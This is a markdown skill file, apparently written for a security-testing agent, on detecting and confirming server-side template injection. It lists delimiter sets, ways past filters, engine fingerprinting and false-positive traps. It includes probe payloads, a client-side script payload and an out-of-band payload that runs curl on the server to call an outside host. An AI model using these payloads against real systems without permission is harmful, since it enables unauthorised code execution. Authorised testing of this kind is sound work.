---
name: ssti
aliases: [ssti, template-injection, server-side-template-injection]
tags: [injection, rce, owasp-a03, template-engine]
severity: critical
---
<!-- Adapted from xalgorix (MIT) — internal/tools/skills/data/web-application-security/exploiting-template-injection-vulnerabilities/SKILL.md -->

# Server-Side Template Injection (SSTI)

## When to Use
- User input rendered through a server-side template engine (Jinja2, Twig, Freemarker, Velocity, ERB, Smarty…).
- Error pages, email/PDF/report generators, profile fields, notification templates that include user data.
- Any param that reflects arithmetic results (e.g. `{{7*7}}` → `49`).

## Critical Checks Most Often Missed
- **Try every delimiter set**, not just `{{}}`: `${}`, `#{}`, `<%= %>`, `{}`, `${{}}`, `#set(...)`. WAFs may strip `{{` but not `{%` or encoded braces — test URL-encoded and raw.
- **Non-obvious sinks** that render asynchronously: error/404 pages reflecting the path, email/PDF/report templates, filenames, header values, profile fields.
- **Blind SSTI:** when no output is reflected, use an OOB payload (`{{ ...os.popen('curl http://OOB')... }}`).
- **Client-side (CSTI):** `{{constructor.constructor('alert(1)')()}}` on Angular/Vue — a non-evaluating server does not rule out CSTI.

## Validation / Confirm Steps
- Positive signal is **server-side evaluation**: `{{7*7}}` → `49`, `${7*7}` → `49`, `#{7*7}` → `49`, `<%= 7*7 %>` → `49`, `{7*7}` → `49`. The literal `7*7` staying means no evaluation at that syntax — try the next.
- **Fingerprint before claiming RCE** via the divergence test: `{{7*'7'}}` → `7777777` = Jinja2; `49` = Twig; `${7*7}` evaluating = Freemarker/Velocity/Spring EL; `#{7*7}` = Thymeleaf/Ruby. Engine-specific RCE only works after the correct fingerprint.

## False-Positive Traps
- A reflected `7*7` (echoed literally) is just reflection/XSS, **not** SSTI. Only a computed `49` (or string-multiplication tell `{{7*'7'}}` → `7777777`) proves template execution.
- Don't conclude negative until you've tried all delimiter sets, a cross-engine polyglot, non-obvious sinks, blind/OOB, encoded payloads, and CSTI.
